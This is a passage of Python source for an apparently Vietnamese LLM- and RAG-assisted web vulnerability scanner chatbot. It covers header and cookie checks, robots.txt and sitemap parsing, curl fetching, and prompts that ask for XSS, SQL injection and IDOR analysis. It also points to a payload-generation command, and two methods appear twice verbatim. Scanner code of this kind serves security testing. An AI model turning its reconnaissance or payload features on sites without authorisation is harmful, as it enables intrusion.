    def _extract_cookies(self, headers: Dict[str, str]) -> Dict[str, Any]:
        """Extract and analyze cookies"""
        cookies = {
            'cookies': [],
            'security_flags': [],
            'recommendations': []
        }
        
        set_cookie = headers.get('Set-Cookie', '')
        if set_cookie:
            # Parse cookies (simplified)
            cookie_parts = set_cookie.split(';')
            cookie_name = cookie_parts[0].split('=')[0] if '=' in cookie_parts[0] else cookie_parts[0]
            
            cookies['cookies'].append({
                'name': cookie_name,
                'raw': set_cookie
            })
            
            # Check security flags
            if 'Secure' not in set_cookie:
                cookies['recommendations'].append("Add 'Secure' flag to cookies")
            if 'HttpOnly' not in set_cookie:
                cookies['recommendations'].append("Add 'HttpOnly' flag to cookies")
            if 'SameSite' not in set_cookie:
                cookies['recommendations'].append("Add 'SameSite' flag to cookies")
        
        return cookies
    
    def _extract_csp(self, headers: Dict[str, str]) -> Dict[str, Any]:
        """Extract Content Security Policy"""
        csp_header = headers.get('Content-Security-Policy', '')
        if csp_header:
            return {
                'present': True,
                'value': csp_header,
                'directives': self._parse_csp_directives(csp_header)
            }
        return {
            'present': False,
            'recommendation': 'Add Content-Security-Policy header'
        }
    
    def _parse_robots_txt(self, content: str) -> List[str]:
        """Parse robots.txt to extract disallowed paths"""
        disallowed = []
        for line in content.split('\n'):
            line = line.strip()
            if line.startswith('Disallow:'):
                path = line.replace('Disallow:', '').strip()
                if path:
                    disallowed.append(path)
        return disallowed
    
    def _extract_sitemap_urls(self, content: str) -> List[str]:
        """Extract sitemap URLs from robots.txt"""
        sitemaps = []
        for line in content.split('\n'):
            line = line.strip()
            if line.startswith('Sitemap:'):
                url = line.replace('Sitemap:', '').strip()
                if url:
                    sitemaps.append(url)
        return sitemaps
    
    def _parse_sitemap_xml(self, content: str) -> List[str]:
        """Parse sitemap.xml to extract URLs"""
        urls = []
        # Simple XML parsing (in real implementation, use proper XML parser)
        import re
        url_pattern = r'<loc>(.*?)</loc>'
        matches = re.findall(url_pattern, content)
        return matches
    
    def _parse_csp_directives(self, csp: str) -> Dict[str, str]:
        """Parse CSP directives"""
        directives = {}
        for directive in csp.split(';'):
            if ' ' in directive:
                key, value = directive.strip().split(' ', 1)
                directives[key] = value
        return directives
    
    async def _curl_request(self, url: str) -> Dict[str, Any]:
        """Perform curl request and return detailed response"""
        try:
            import subprocess
            import json
            
            # Use curl to get detailed response
            curl_command = [
                'curl', '-s', '-i', '-L', '--max-time', '10',
                '--user-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                url
            ]
            
            result = subprocess.run(curl_command, capture_output=True, text=True, timeout=15)
            
            if result.returncode == 0:
                response_text = result.stdout
                
                # Parse headers and body
                if '\r\n\r\n' in response_text:
                    headers_text, body = response_text.split('\r\n\r\n', 1)
                elif '\n\n' in response_text:
                    headers_text, body = response_text.split('\n\n', 1)
                else:
                    headers_text = response_text
                    body = ""
                
                # Parse headers
                headers = {}
                status_line = ""
                for line in headers_text.split('\n'):
                    if line.startswith('HTTP/'):
                        status_line = line.strip()
                    elif ':' in line:
                        key, value = line.split(':', 1)
                        headers[key.strip()] = value.strip()
                
                # Extract status code
                status_code = 200
                if status_line:
                    try:
                        status_code = int(status_line.split()[1])
                    except:
                        pass
                
                return {
                    'url': url,
                    'status_code': status_code,
                    'status_line': status_line,
                    'headers': headers,
                    'body': body[:5000],  # Limit body size
                    'body_length': len(body),
                    'response_time': time.strftime('%Y-%m-%d %H:%M:%S'),
                    'success': True
                }
            else:
                return {
                    'url': url,
                    'error': result.stderr,
                    'success': False,
                    'response_time': time.strftime('%Y-%m-%d %H:%M:%S')
                }
                
        except subprocess.TimeoutExpired:
            return {
                'url': url,
                'error': 'Request timeout',
                'success': False,
                'response_time': time.strftime('%Y-%m-%d %H:%M:%S')
            }
        except Exception as e:
            return {
                'url': url,
                'error': str(e),
                'success': False,
                'response_time': time.strftime('%Y-%m-%d %H:%M:%S')
            }
    
    async def _analyze_scan_results(self, scan_results: Dict[str, Any], target_url: str) -> str:
        """Analyze scan results với LLM"""
        try:
            # Prepare enhanced context from complete RAG
            rag_context = self._get_enhanced_rag_context_for_analysis(scan_results)
            
            # Prepare response data for analysis
            responses_data = []
            for response in scan_results.get('responses', []):
                if response.get('success', False):
                    responses_data.append({
                        'url': response.get('url', ''),
                        'status_code': response.get('status_code', ''),
                        'headers': response.get('headers', {}),
                        'body_preview': response.get('body', '')[:1000],
                        'body_length': response.get('body_length', 0)
                    })
            
            prompt = f"""
            Bạn là chuyên gia bảo mật web với kiến thức sâu rộng. Hãy phân tích kết quả scan này:
            
            Target URL: {target_url}
            Scan Time: {scan_results.get('scan_time', 'N/A')}
            Total Responses: {len(responses_data)}
            
            Response Details:
            {json.dumps(responses_data, indent=2, ensure_ascii=False)}
            
            Additional URLs Scanned:
            {scan_results.get('additional_urls', [])[:10]}
            
            Thông tin tham khảo từ RAG tổng hợp:
            {rag_context}
            
            Hãy phân tích chi tiết theo format sau:
            
            ## [SCAN] **TỔNG QUAN BẢO MẬT**
            - Đánh giá tổng thể về bảo mật của website
            - Mức độ rủi ro chung
            
            ## [ALERT] **LỖ HỔNG BẢO MẬT PHÁT HIỆN**
            ### XSS (Cross-Site Scripting)
            - Phân tích khả năng XSS dựa trên response
            - Đánh giá input validation và output encoding
            
            ### SQL Injection
            - Phân tích khả năng SQL injection
            - Kiểm tra error messages và database exposure
            
            ### Security Misconfiguration
            - Missing security headers
            - Server information disclosure
            - Debug information exposure
            
            ### IDOR (Insecure Direct Object Reference)
            - Phân tích object references
            - Kiểm tra access control
            
            ## [CHART] **PHÂN TÍCH CHI TIẾT**
            ### Headers Analysis
            - Security headers có/thiếu
            - Server information disclosure
            - Content-Type và encoding issues
            
            ### Response Body Analysis
            - Sensitive information exposure
            - Error messages và debug info
            - Version information disclosure
            
            ### Subdomain/Path Discovery
            - Các endpoint có thể khai thác
            - Admin panels và sensitive paths
            - Backup files và configuration files
            
            ## [WARNING] **MỨC ĐỘ NGHIÊM TRỌNG**
            - Critical: Lỗ hổng có thể dẫn đến compromise hoàn toàn
            - High: Lỗ hổng có thể dẫn đến data breach
            - Medium: Lỗ hổng có thể dẫn đến information disclosure
            - Low: Lỗ hổng có thể dẫn đến reconnaissance
            
            ## [WRENCH] **KHUYẾN NGHỊ KHẮC PHỤC**
            - Specific steps để fix từng lỗ hổng
            - Best practices cho security
            - Immediate actions cần thực hiện
            
            ## [BOOK] **URLS THAM KHẢO**
            - Test sites để verify
            - Documentation và tools
            - Security resources
            
            Sử dụng thông tin từ RAG để đưa ra phân tích chính xác và tránh ảo giác.
            """
            
            analysis = self.llm_client.chat(prompt, max_output_tokens=1000)
            return analysis
            
        except Exception as e:
            print(f"Error analyzing scan results: {e}")
            return f"Lỗi khi phân tích: {str(e)}"
    
    def _get_enhanced_rag_context_for_analysis(self, scan_results: Dict[str, Any]) -> str:
        """Get enhanced RAG context for scan analysis"""
        try:
            context_parts = []
            
            # Get vulnerability knowledge from complete RAG
            vuln_knowledge = self.vulnerability_rag.get('vulnerability_knowledge', {})
            
            # Add XSS information
            if 'xss' in vuln_knowledge:
                xss_info = vuln_knowledge['xss']
                context_parts.append(f"**XSS (Cross-Site Scripting):**")
                context_parts.append(f"- Mô tả: {xss_info.get('description', '')}")
                context_parts.append(f"- Severity: {xss_info.get('severity', '')}")
                context_parts.append(f"- CWE: {xss_info.get('cwe', '')}")
                context_parts.append(f"- OWASP Top 10: {xss_info.get('owasp_top10', '')}")
                
                # Add example URLs
                example_urls = xss_info.get('example_urls', [])
                if example_urls:
                    context_parts.append(f"- URLs tham khảo: {', '.join(example_urls[:3])}")
                
                # Add detection patterns
                detection_patterns = xss_info.get('detection_patterns', [])
                if detection_patterns:
                    context_parts.append(f"- Dấu hiệu phát hiện: {', '.join(detection_patterns[:3])}")
                
                context_parts.append("")
            
            # Add SQL Injection information
            if 'sql_injection' in vuln_knowledge:
                sql_info = vuln_knowledge['sql_injection']
                context_parts.append(f"**SQL Injection:**")
                context_parts.append(f"- Mô tả: {sql_info.get('description', '')}")
                context_parts.append(f"- Severity: {sql_info.get('severity', '')}")
                context_parts.append(f"- CWE: {sql_info.get('cwe', '')}")
                context_parts.append(f"- OWASP Top 10: {sql_info.get('owasp_top10', '')}")
                
                # Add example URLs
                example_urls = sql_info.get('example_urls', [])
                if example_urls:
                    context_parts.append(f"- URLs tham khảo: {', '.join(example_urls[:3])}")
                
                # Add detection patterns
                detection_patterns = sql_info.get('detection_patterns', [])
                if detection_patterns:
                    context_parts.append(f"- Dấu hiệu phát hiện: {', '.join(detection_patterns[:3])}")
                
                context_parts.append("")
            
            # Add Misconfiguration information
            if 'misconfiguration' in vuln_knowledge:
                misconfig_info = vuln_knowledge['misconfiguration']
                context_parts.append(f"**Security Misconfiguration:**")
                context_parts.append(f"- Mô tả: {misconfig_info.get('description', '')}")
                context_parts.append(f"- Severity: {misconfig_info.get('severity', '')}")
                context_parts.append(f"- CWE: {misconfig_info.get('cwe', '')}")
                context_parts.append(f"- OWASP Top 10: {misconfig_info.get('owasp_top10', '')}")
                
                # Add example URLs
                example_urls = misconfig_info.get('example_urls', [])
                if example_urls:
                    context_parts.append(f"- URLs tham khảo: {', '.join(example_urls[:3])}")
                
                # Add detection patterns
                detection_patterns = misconfig_info.get('detection_patterns', [])
                if detection_patterns:
                    context_parts.append(f"- Dấu hiệu phát hiện: {', '.join(detection_patterns[:3])}")
                
                context_parts.append("")
            
            # Add IDOR information
            if 'idor' in vuln_knowledge:
                idor_info = vuln_knowledge['idor']
                context_parts.append(f"**IDOR (Insecure Direct Object Reference):**")
                context_parts.append(f"- Mô tả: {idor_info.get('description', '')}")
                context_parts.append(f"- Severity: {idor_info.get('severity', '')}")
                context_parts.append(f"- CWE: {idor_info.get('cwe', '')}")
                context_parts.append(f"- OWASP Top 10: {idor_info.get('owasp_top10', '')}")
                
                # Add example URLs
                example_urls = idor_info.get('example_urls', [])
                if example_urls:
                    context_parts.append(f"- URLs tham khảo: {', '.join(example_urls[:3])}")
                
                # Add detection patterns
                detection_patterns = idor_info.get('detection_patterns', [])
                if detection_patterns:
                    context_parts.append(f"- Dấu hiệu phát hiện: {', '.join(detection_patterns[:3])}")
                
                context_parts.append("")
            
            # Add LLM analysis guidelines
            llm_guidelines = self.vulnerability_rag.get('llm_analysis_guidelines', {})
            if llm_guidelines:
                context_parts.append("**Hướng dẫn phân tích LLM:**")
                for vuln_type, guidelines in llm_guidelines.items():
                    context_parts.append(f"- {vuln_type}: {guidelines.get('key_indicators', [])[:2]}")
                context_parts.append("")
            
            return "\n".join(context_parts)
            
        except Exception as e:
            return f"Lỗi khi lấy enhanced RAG context: {str(e)}"
    
    async def _handle_scan_command(self, message: str) -> ChatResponse:
        """Xử lý lệnh /scan với RAG-enhanced analysis"""
        try:
            # Extract URL from message
            url_pattern = r'https?://[^\s]+'
            url_match = re.search(url_pattern, message)
            
            if not url_match:
                return ChatResponse(
                    message="[ERROR] Vui lòng cung cấp URL để scan. Ví dụ: /scan http://example.com",
                    command=ChatCommand.SCAN,
                    suggestions=[
                        "Sử dụng: /scan http://testphp.vulnweb.com/",
                        "Sử dụng: /scan http://demo.testfire.net/",
                        "Xem hướng dẫn: /help"
                    ]
                )
            
            target_url = url_match.group()
            
            # Get RAG context for scan
            rag_context = self._get_scan_rag_context(target_url)
            
            # Start scan with enhanced system
            from app.core.enhanced_scan_system import EnhancedScanSystem
            scan_system = EnhancedScanSystem()
            
            # Create scan job
            job_id = await scan_system.start_scan(target_url)
            
            # Create response message with RAG importance
            response_message = f"""[SCAN] **Enhanced Security Scan với RAG Intelligence**

[LOCATION] **Target:** {target_url}
[JOB] **Job ID:** {job_id}
[RAG] **Knowledge Base:** Active với {len(rag_context)} characters context

[BRAIN] **RAG-Enhanced Analysis:**
{rag_context[:500]}...

[PROCESS] **Scan Pipeline:**
1. **Reconnaissance** - RAG-guided target analysis
2. **Crawling** - RAG-enhanced path discovery  
3. **Fuzzing** - RAG payload techniques
4. **Vulnerability Detection** - RAG pattern matching
5. **LLM + RAG Analysis** - Comprehensive intelligence

[FEATURES] **RAG Intelligence:**
• OWASP Top 10 2023 knowledge
• Advanced payload techniques
• Real-world vulnerability patterns
• Best practice remediation
• CVE database integration

[STATUS] Scan đang chạy... Sử dụng /scan-status để kiểm tra tiến độ.

[RAG IMPACT] RAG knowledge base cung cấp:
- Context chính xác cho từng loại lỗ hổng
- Advanced detection techniques
- Comprehensive remediation guidance
- Real-world attack patterns
- Industry best practices"""
            
            return ChatResponse(
                message=response_message,
                command=ChatCommand.SCAN,
                target_url=target_url,
                suggestions=[
                    f"Kiểm tra tiến độ: /scan-status {job_id}",
                    f"Xem kết quả: /scan-results {job_id}",
                    "Hủy scan: /scan-cancel",
                    "Tạo payload: /payload xss " + target_url
                ]
            )
            
        except Exception as e:
            return ChatResponse(
                message=f"[ERROR] Lỗi khi bắt đầu scan: {str(e)}",
                command=ChatCommand.SCAN,
                suggestions=[
                    "Kiểm tra URL có hợp lệ không",
                    "Thử lại sau vài giây",
                    "Sử dụng /help để xem hướng dẫn"
                ]
            )
    
    def _get_scan_rag_context(self, target_url: str) -> str:
        """Get RAG context for scan analysis"""
        try:
            context_parts = []
            
            # Get RAG knowledge for comprehensive scan
            if self.kb_retriever:
                # Get OWASP Top 10 2023 knowledge
                owasp_docs = self.kb_retriever.retrieve("OWASP Top 10 2023 security risks", k=5)
                if owasp_docs:
                    context_parts.append("**OWASP Top 10 2023 Knowledge:**")
                    for doc in owasp_docs:
                        context_parts.append(f"- {(getattr(doc, 'content', str(doc)) if hasattr(doc, 'content') else str(doc))[:200]}...")
                    context_parts.append("")
                
                # Get vulnerability detection techniques
                detection_docs = self.kb_retriever.retrieve("vulnerability detection techniques", k=4)
                if detection_docs:
                    context_parts.append("**Detection Techniques:**")
                    for doc in detection_docs:
                        context_parts.append(f"- {(getattr(doc, 'content', str(doc)) if hasattr(doc, 'content') else str(doc))[:200]}...")
                    context_parts.append("")
                
                # Get security headers knowledge
                headers_docs = self.kb_retriever.retrieve("security headers HTTP protection", k=3)
                if headers_docs:
                    context_parts.append("**Security Headers Analysis:**")
                    for doc in headers_docs:
                        context_parts.append(f"- {(getattr(doc, 'content', str(doc)) if hasattr(doc, 'content') else str(doc))[:200]}...")
                    context_parts.append("")
                
                # Get payload techniques
                payload_docs = self.kb_retriever.retrieve("payload techniques XSS SQL injection", k=4)
                if payload_docs:
                    context_parts.append("**Advanced Payload Techniques:**")
                    for doc in payload_docs:
                        context_parts.append(f"- {(getattr(doc, 'content', str(doc)) if hasattr(doc, 'content') else str(doc))[:200]}...")
                    context_parts.append("")
            
            # Add target-specific analysis
            context_parts.append(f"**Target Analysis for {target_url}:**")
            context_parts.append("- Comprehensive vulnerability assessment")
            context_parts.append("- RAG-guided detection patterns")
            context_parts.append("- Advanced payload techniques")
            context_parts.append("- Real-world attack scenarios")
            context_parts.append("- Industry best practices")
            
            return "\n".join(context_parts)
            
        except Exception as e:
            return f"RAG context retrieval error: {str(e)}"
    
    def _get_enhanced_rag_context_for_natural_response(self, message: str) -> str:
        """Get enhanced RAG context for natural response"""
        try:
            context_parts = []
            
            # Get vulnerability knowledge from complete RAG
            vuln_knowledge = self.vulnerability_rag.get('vulnerability_knowledge', {})
            
            # Check if message contains vulnerability keywords
            message_lower = message.lower()
            
            if any(keyword in message_lower for keyword in ['xss', 'cross-site scripting', 'script injection']):
                if 'xss' in vuln_knowledge:
                    xss_info = vuln_knowledge['xss']
                    context_parts.append(f"**XSS (Cross-Site Scripting):**")
                    context_parts.append(f"- Mô tả: {xss_info.get('description', '')}")
                    context_parts.append(f"- Severity: {xss_info.get('severity', '')}")
                    context_parts.append(f"- CWE: {xss_info.get('cwe', '')}")
                    
                    # Add example URLs
                    example_urls = xss_info.get('example_urls', [])
                    if example_urls:
                        context_parts.append(f"- URLs tham khảo: {', '.join(example_urls[:2])}")
                    
                    context_parts.append("")
            
            if any(keyword in message_lower for keyword in ['sql', 'sql injection', 'database injection']):
                if 'sql_injection' in vuln_knowledge:
                    sql_info = vuln_knowledge['sql_injection']
                    context_parts.append(f"**SQL Injection:**")
                    context_parts.append(f"- Mô tả: {sql_info.get('description', '')}")
                    context_parts.append(f"- Severity: {sql_info.get('severity', '')}")
                    context_parts.append(f"- CWE: {sql_info.get('cwe', '')}")
                    
                    # Add example URLs
                    example_urls = sql_info.get('example_urls', [])
                    if example_urls:
                        context_parts.append(f"- URLs tham khảo: {', '.join(example_urls[:2])}")
                    
                    context_parts.append("")
            
            if any(keyword in message_lower for keyword in ['misconfig', 'misconfiguration', 'config', 'configuration']):
                if 'misconfiguration' in vuln_knowledge:
                    misconfig_info = vuln_knowledge['misconfiguration']
                    context_parts.append(f"**Security Misconfiguration:**")
                    context_parts.append(f"- Mô tả: {misconfig_info.get('description', '')}")
                    context_parts.append(f"- Severity: {misconfig_info.get('severity', '')}")
                    context_parts.append(f"- CWE: {misconfig_info.get('cwe', '')}")
                    
                    # Add example URLs
                    example_urls = misconfig_info.get('example_urls', [])
                    if example_urls:
                        context_parts.append(f"- URLs tham khảo: {', '.join(example_urls[:2])}")
                    
                    context_parts.append("")
            
            if any(keyword in message_lower for keyword in ['idor', 'direct object reference', 'object reference']):
                if 'idor' in vuln_knowledge:
                    idor_info = vuln_knowledge['idor']
                    context_parts.append(f"**IDOR (Insecure Direct Object Reference):**")
                    context_parts.append(f"- Mô tả: {idor_info.get('description', '')}")
                    context_parts.append(f"- Severity: {idor_info.get('severity', '')}")
                    context_parts.append(f"- CWE: {idor_info.get('cwe', '')}")
                    
                    # Add example URLs
                    example_urls = idor_info.get('example_urls', [])
                    if example_urls:
                        context_parts.append(f"- URLs tham khảo: {', '.join(example_urls[:2])}")
                    
                    context_parts.append("")
            
            # Add general information if no specific vulnerability mentioned
            if not context_parts:
                context_parts.append("**Thông tin chung về bảo mật web:**")
                context_parts.append("- XSS: Cross-Site Scripting - lỗ hổng cho phép inject malicious scripts")
                context_parts.append("- SQL Injection: lỗ hổng cho phép inject SQL code vào database queries")
                context_parts.append("- Misconfiguration: lỗ hổng do cấu hình bảo mật không đúng")
                context_parts.append("- IDOR: lỗ hổng cho phép truy cập trực tiếp vào objects mà không có authorization")
                context_parts.append("")
                context_parts.append("**Các lệnh có thể sử dụng:**")
                context_parts.append("- /scan <url>: Quét lỗ hổng trên URL")
                context_parts.append("- /payload <type> <url>: Tạo payload cho loại lỗ hổng")
                context_parts.append("- /help: Hiển thị hướng dẫn")
                context_parts.append("")
            
            return "\n".join(context_parts)
            
        except Exception as e:
            return f"Lỗi khi lấy enhanced RAG context: {str(e)}"
    
    async def _handle_scan_command(self, message: str) -> ChatResponse:
        """Xử lý lệnh /scan với RAG-enhanced analysis"""
        try:
            # Extract URL from message
            url_pattern = r'https?://[^\s]+'
            url_match = re.search(url_pattern, message)
            
            if not url_match:
                return ChatResponse(
                    message="[ERROR] Vui lòng cung cấp URL để scan. Ví dụ: /scan http://example.com",
                    command=ChatCommand.SCAN,
                    suggestions=[
                        "Sử dụng: /scan http://testphp.vulnweb.com/",
                        "Sử dụng: /scan http://demo.testfire.net/",
                        "Xem hướng dẫn: /help"
                    ]
                )
            
            target_url = url_match.group()
            
            # Get RAG context for scan
            rag_context = self._get_scan_rag_context(target_url)
            
            # Start scan with enhanced system
            from app.core.enhanced_scan_system import EnhancedScanSystem
            scan_system = EnhancedScanSystem()
            
            # Create scan job
            job_id = await scan_system.start_scan(target_url)
            
            # Create response message with RAG importance
            response_message = f"""[SCAN] **Enhanced Security Scan với RAG Intelligence**

[LOCATION] **Target:** {target_url}
[JOB] **Job ID:** {job_id}
[RAG] **Knowledge Base:** Active với {len(rag_context)} characters context

[BRAIN] **RAG-Enhanced Analysis:**
{rag_context[:500]}...

[PROCESS] **Scan Pipeline:**
1. **Reconnaissance** - RAG-guided target analysis
2. **Crawling** - RAG-enhanced path discovery  
3. **Fuzzing** - RAG payload techniques
4. **Vulnerability Detection** - RAG pattern matching
5. **LLM + RAG Analysis** - Comprehensive intelligence

[FEATURES] **RAG Intelligence:**
• OWASP Top 10 2023 knowledge
• Advanced payload techniques
• Real-world vulnerability patterns
• Best practice remediation
• CVE database integration

[STATUS] Scan đang chạy... Sử dụng /scan-status để kiểm tra tiến độ.

[RAG IMPACT] RAG knowledge base cung cấp:
- Context chính xác cho từng loại lỗ hổng
- Advanced detection techniques
- Comprehensive remediation guidance
- Real-world attack patterns
- Industry best practices"""
            
            return ChatResponse(
                message=response_message,
                command=ChatCommand.SCAN,
                target_url=target_url,
                suggestions=[
                    f"Kiểm tra tiến độ: /scan-status {job_id}",
                    f"Xem kết quả: /scan-results {job_id}",
                    "Hủy scan: /scan-cancel",
                    "Tạo payload: /payload xss " + target_url
                ]
            )
            
        except Exception as e:
            return ChatResponse(
                message=f"[ERROR] Lỗi khi bắt đầu scan: {str(e)}",
                command=ChatCommand.SCAN,
                suggestions=[
                    "Kiểm tra URL có hợp lệ không",
                    "Thử lại sau vài giây",
                    "Sử dụng /help để xem hướng dẫn"
                ]
            )
    
    def _get_scan_rag_context(self, target_url: str) -> str:
        """Get RAG context for scan analysis"""
        try:
            context_parts = []
            
            # Get RAG knowledge for comprehensive scan
            if self.kb_retriever:
                # Get OWASP Top 10 2023 knowledge
                owasp_docs = self.kb_retriever.retrieve("OWASP Top 10 2023 security risks", k=5)
                if owasp_docs:
                    context_parts.append("**OWASP Top 10 2023 Knowledge:**")
                    for doc in owasp_docs:
                        context_parts.append(f"- {(getattr(doc, 'content', str(doc)) if hasattr(doc, 'content') else str(doc))[:200]}...")
                    context_parts.append("")
                
                # Get vulnerability detection techniques
                detection_docs = self.kb_retriever.retrieve("vulnerability detection techniques", k=4)
                if detection_docs:
                    context_parts.append("**Detection Techniques:**")
                    for doc in detection_docs:
                        context_parts.append(f"- {(getattr(doc, 'content', str(doc)) if hasattr(doc, 'content') else str(doc))[:200]}...")
                    context_parts.append("")
                
                # Get security headers knowledge
                headers_docs = self.kb_retriever.retrieve("security headers HTTP protection", k=3)
                if headers_docs:
                    context_parts.append("**Security Headers Analysis:**")
                    for doc in headers_docs:
                        context_parts.append(f"- {(getattr(doc, 'content', str(doc)) if hasattr(doc, 'content') else str(doc))[:200]}...")
                    context_parts.append("")
                
                # Get payload techniques
                payload_docs = self.kb_retriever.retrieve("payload techniques XSS SQL injection", k=4)
                if payload_docs:
                    context_parts.append("**Advanced Payload Techniques:**")
                    for doc in payload_docs:
                        context_parts.append(f"- {(getattr(doc, 'content', str(doc)) if hasattr(doc, 'content') else str(doc))[:200]}...")
                    context_parts.append("")
            
            # Add target-specific analysis
            context_parts.append(f"**Target Analysis for {target_url}:**")
            context_parts.append("- Comprehensive vulnerability assessment")
            context_parts.append("- RAG-guided detection patterns")
            context_parts.append("- Advanced payload techniques")
            context_parts.append("- Real-world attack scenarios")
            context_parts.append("- Industry best practices")
            
            return "\n".join(context_parts)
            
        except Exception as e:
            return f"RAG context retrieval error: {str(e)}"
